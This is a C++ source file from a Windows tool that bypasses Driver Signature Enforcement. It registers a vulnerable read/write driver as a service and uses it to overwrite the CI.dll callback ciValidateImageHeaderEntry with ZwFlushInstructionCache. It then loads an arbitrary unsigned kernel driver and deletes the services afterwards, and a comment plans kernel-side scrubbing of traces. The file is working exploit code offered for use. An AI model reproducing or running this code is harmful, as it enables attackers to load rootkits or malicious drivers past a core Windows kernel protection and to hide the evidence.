#include "includes.h"
#include "nt_structs.h"
#include "ntdll.h"


/*
* driver_init
*
* Purpose:
*
* Initalize everything needed / associated with loading our unsigned driver.
*
* Params:
*
* _IN_ LoaderName, _IN_ DriverName 
* 
* LoaderName: Name of RW vuln driver
* DriverName: Driver you want to load
* 
*/
NTSTATUS vuln::driver_init( PWCHAR LoaderName, PWCHAR DriverName)
{
	WCHAR LoaderPath[MAX_PATH]{ 0 };
	WCHAR DriverPath[MAX_PATH]{ 0 };

	constexpr ULONG SE_LOAD_DRIVER_PRIVILEGE{ 10UL };
	BOOLEAN SeLoadDriverWasEnabled{ 0 };

	std::wprintf( L"[+] Load Driver called...\n" );

	// Priv Check -> fix
	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
	if ( !NT_SUCCESS( stat ) ) return stat;

	stat = RtlGetFullPathName_UEx( LoaderName, MAX_PATH * sizeof( WCHAR ), LoaderPath, nullptr, nullptr );
	if ( !NT_SUCCESS( stat ) ) return stat;

	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
	if ( !NT_SUCCESS( stat ) ) return stat;

	stat = helpers::CreateDriverService( LoaderServiceName, LoaderPath );
	if ( !NT_SUCCESS( stat ) ) return stat;

	stat = helpers::CreateDriverService( DriverServiceName, DriverPath );
	if ( !NT_SUCCESS( stat ) ) return stat;

	std::wprintf( L"[+] Calling with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
	wprintf( L"\n" );
		vuln::drv_call( LoaderServiceName, DriverServiceName, 1 );

	return stat;
}

/*
* drv_call
*
* Purpose:
*
* Disable DSE via flushing CI.dll (nt!_ciValidateImageHeaderEntry)
*
* Params:
*
* _IN_ LoaderServiceName, _IN_ DriverName
*
* LoaderServiceName: Name of RW vuln driver Service Name
* DriverServiceName: Name of your DriverServiceName Name
* Should_load:		 dbg param (ignore)
* 
* Pattern (Win11 2H24): 
*       mov r8d, 5               (opcode + immediate dword 5)
*       lea r9, [rip + offset]   (RIP-relative addressing with 4-byte offset placeholder)
*       mov [rsp+0x20], rax      (store rax at rsp+0x20)
*/

NTSTATUS vuln::drv_call( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load ) {
	if ( !should_load )
		wprintf( L"[!] DEBUG -> No Loading Selected : %d\n", should_load ); // Purely dbg
	else
		wprintf( L"[!] DEBUG -> Loading Selected : %d\n", should_load );

	NTSTATUS stat = helpers::EnsureDeviceHandle( &helpers::dev, LoaderServiceName );
		if ( !NT_SUCCESS( stat ) ) return{ STATUS_INVALID_HANDLE };

	auto ci = modules::get_CIValidate_ImageHeaderEntry();

	wprintf( L"[+] ciValidateImageHeaderEntry: %p\n", ci.ciValidateImageHeaderEntry );
	wprintf( L"[+] zwFlushInstructionCache   : %p\n", ci.zwFlushInstructionCache );

	DWORD64 originalCallback{};

	stat = helpers::read_64( ci.ciValidateImageHeaderEntry, originalCallback );
		if ( !NT_SUCCESS( stat ) ) goto cleanup;

	wprintf( L"[*] Original Callback : %p\n", originalCallback );

	if ( should_load ) {
		wprintf( L"[*] Flushing ciValidateImageHeaderEntry: %p -> %p\n", ci.ciValidateImageHeaderEntry, ci.zwFlushInstructionCache );
		stat = helpers::write_64( ci.ciValidateImageHeaderEntry, ci.zwFlushInstructionCache );
			if ( !NT_SUCCESS( stat ) ) goto cleanup;

		wprintf( L"[*] Attempting to load unsigned driver...\n" );
		stat = helpers::LoadDriver( DriverServiceName ); // ciValidateImageHeaderEntry structure waiting on cache reset -> DSE enforcment flags ignored, load driver
		
		if ( ci.ciValidateImageHeaderEntry != originalCallback )
			stat = helpers::write_64( ci.ciValidateImageHeaderEntry, originalCallback );

		if ( NT_SUCCESS( stat ) ) wprintf( L"[*] ciValidateImageHeaderEntry (%p) restored...\n", ci.ciValidateImageHeaderEntry );

	}
cleanup:
	if ( helpers::dev ) NtClose( helpers::dev );
	helpers::UnloadDriver( LoaderServiceName );
	helpers::DeleteService( LoaderServiceName ); // These bottom two entries need to be done driver side -> TODO: make them driver side... and scrubbing entries kernel side, etc
	helpers::DeleteService( DriverServiceName );
	return stat;
}

